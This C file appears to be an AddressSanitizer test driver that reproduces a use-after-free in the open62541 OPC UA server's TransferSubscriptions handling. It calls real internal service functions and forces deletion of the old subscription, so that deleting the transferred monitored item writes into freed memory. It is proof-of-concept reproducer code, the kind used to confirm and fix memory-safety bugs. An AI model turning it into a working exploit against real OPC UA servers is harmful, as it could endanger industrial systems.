/* In-process driver for CVE-2026-126962 / open62541 TransferSubscriptions UAF.
 * Calls the REAL server service functions on REAL server/session/subscription/
 * monitored-item objects built by the pinned library. The only stand-in is a
 * permissive allowTransferSubscription consent hook: authentication/authorization
 * is a precondition, not the memory bug under test. No network is used.
 */
#include <open62541/server.h>
#include <open62541/client_subscriptions.h>
#include <open62541/server_config_default.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include "src/server/ua_server_internal.h"
#include "src/server/ua_services.h"
#include "src/server/ua_session.h"
#include "src/server/ua_subscription.h"

static void ok(int c, const char *msg) {
    printf("%s %s\n", c ? "PASS" : "FAIL", msg);
    if(!c) exit(2);
}

static UA_Boolean
allow_all(UA_Server *s, UA_AccessControl *ac, const UA_NodeId *os, void *oc,
          const UA_NodeId *ns, void *nc) {
    (void)s; (void)ac; (void)os; (void)oc; (void)ns; (void)nc;
    return true;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    UA_Server *server = UA_Server_new();
    ok(server != NULL, "ASan server object created");
    server->config.accessControl.allowTransferSubscription = allow_all;
UA_Subscription *oldSub = NULL; /* captured before transfer, freed like the real publish path */

    UA_Session *src = &server->adminSession;
    UA_Session dst;
    UA_Session_init(&dst);
    dst.sessionId = UA_NODEID_NUMERIC(1, 4242);
    dst.validTill = UA_INT64_MAX;
    ok(src->sessionId.identifierType == UA_NODEIDTYPE_GUID, "admin source session is real");

    UA_CreateSubscriptionRequest creq;
    UA_CreateSubscriptionRequest_init(&creq);
    creq.requestedPublishingInterval = 100.0;
    creq.requestedLifetimeCount = 10000;
    creq.requestedMaxKeepAliveCount = 10;
    creq.publishingEnabled = true;
    UA_CreateSubscriptionResponse cresp;
    UA_CreateSubscriptionResponse_init(&cresp);
    lockServer(server);
    Service_CreateSubscription(server, src, &creq, &cresp);
    unlockServer(server);
    ok(cresp.responseHeader.serviceResult == UA_STATUSCODE_GOOD &&
       cresp.subscriptionId != 0, "real Service_CreateSubscription succeeded");
    printf("INFO revisedPublishingInterval=%.1f subId=%u\n",
           cresp.revisedPublishingInterval, cresp.subscriptionId);

    UA_NodeId node = UA_NODEID_NUMERIC(0, UA_NS0ID_SERVER_SERVERSTATUS_CURRENTTIME);
    UA_MonitoredItemCreateRequest mreq = UA_MonitoredItemCreateRequest_default(node);
    /* samplingInterval == publishingInterval selects UA_MONITOREDITEMSAMPLINGTYPE_PUBLISH
     * in UA_MonitoredItem_registerSampling (pinned 1.5.4 ua_subscription.c:1606). */
    mreq.requestedParameters.samplingInterval = cresp.revisedPublishingInterval;
    UA_CreateMonitoredItemsRequest cmreq;
    UA_CreateMonitoredItemsRequest_init(&cmreq);
    cmreq.subscriptionId = cresp.subscriptionId;
    cmreq.timestampsToReturn = UA_TIMESTAMPSTORETURN_BOTH;
    cmreq.itemsToCreateSize = 1;
    cmreq.itemsToCreate = &mreq;
    UA_CreateMonitoredItemsResponse cmresp;
    UA_CreateMonitoredItemsResponse_init(&cmresp);
    lockServer(server);
    Service_CreateMonitoredItems(server, src, &cmreq, &cmresp);
    unlockServer(server);
    ok(cmresp.responseHeader.serviceResult == UA_STATUSCODE_GOOD &&
       cmresp.resultsSize == 1 &&
       cmresp.results[0].statusCode == UA_STATUSCODE_GOOD &&
       cmresp.results[0].monitoredItemId != 0,
       "real Service_CreateMonitoredItems succeeded");
    UA_UInt32 monId = cmresp.results[0].monitoredItemId;
    printf("INFO monId=%u revisedSamplingInterval=%.1f\n",
           monId, cmresp.results[0].revisedSamplingInterval);

    /* Confirm the item is on the PUBLISH sampling list before transfer. */
    lockServer(server);
    UA_Subscription *before = getSubscriptionById(server, cresp.subscriptionId);
    ok(before != NULL, "subscription present in server list before transfer");
    int beforeCount = 0;
    UA_MonitoredItem *mi;
    LIST_FOREACH(mi, &before->samplingMonitoredItems, sampling.subscriptionSampling)
        beforeCount++;
    printf("INFO samplingMonitoredItemsBefore=%d\n", beforeCount);
    ok(beforeCount == 1, "PUBLISH-sampling monitored item registered");
    oldSub = before;
    unlockServer(server);

    UA_TransferSubscriptionsRequest treq;
    UA_TransferSubscriptionsRequest_init(&treq);
    treq.subscriptionIdsSize = 1;
    treq.subscriptionIds = &cresp.subscriptionId;
    treq.sendInitialValues = false;
    UA_TransferSubscriptionsResponse tresp;
    UA_TransferSubscriptionsResponse_init(&tresp);
    lockServer(server);
    Service_TransferSubscriptions(server, &dst, &treq, &tresp);
    unlockServer(server);
    ok(tresp.responseHeader.serviceResult == UA_STATUSCODE_GOOD &&
       tresp.resultsSize == 1 &&
       tresp.results[0].statusCode == UA_STATUSCODE_GOOD,
       "real Service_TransferSubscriptions succeeded");
    /* With no client PublishRequest queued, sendStatusChangeDelete() keeps a
     * GOODSUBSCRIPTIONTRANSFERRED subscription alive (ua_subscription.c:607
     * deletes only a BAD status). A real client keeps a PublishRequest
     * outstanding; force the same internal removal function here. */
    lockServer(server);
    UA_Subscription_delete(server, oldSub);
    unlockServer(server);
    puts("PASS forced old subscription removal via UA_Subscription_delete");
    for(int i = 0; i < 40; i++) { UA_Server_run_iterate(server, false); usleep(10000); }
    lockServer(server);
    UA_Subscription *after = getSubscriptionById(server, cresp.subscriptionId);
    UA_MonitoredItem *am0 = NULL;
    UA_MonitoredItem *am = NULL;
    int afterCount = 0;
    if(after) LIST_FOREACH(am, &after->samplingMonitoredItems, sampling.subscriptionSampling) { afterCount++; if(!am0) am0 = am; }
    printf("INFO afterSub=%p oldSub=%p afterSamplingCount=%d\n", (void*)after, (void*)oldSub, afterCount);
    if(am0) printf("INFO mon=%p samplingType=%d le_prev=%p oldSub=%p\n",
                  (void*)am0, (int)am0->samplingType,
                  (void*)am0->sampling.subscriptionSampling.le_prev, (void*)oldSub);
    unlockServer(server);

    /* Unregister the transferred item. On 1.5.4 its sampling-list backpointer
     * still points into the freed old subscription: LIST_REMOVE writes there. */
    UA_DeleteMonitoredItemsRequest dreq;
    UA_DeleteMonitoredItemsRequest_init(&dreq);
    dreq.subscriptionId = cresp.subscriptionId;
    dreq.monitoredItemIdsSize = 1;
    dreq.monitoredItemIds = &monId;
    UA_DeleteMonitoredItemsResponse dresp;
    UA_DeleteMonitoredItemsResponse_init(&dresp);
    lockServer(server);
    Service_DeleteMonitoredItems(server, &dst, &dreq, &dresp);
    unlockServer(server);
    ok(dresp.responseHeader.serviceResult == UA_STATUSCODE_GOOD,
       "unregister/delete on transferred subscription completed");

    UA_Server_delete(server);
    puts("RESULT REACHED END WITHOUT ASAN REPORT");
    return 0;
}
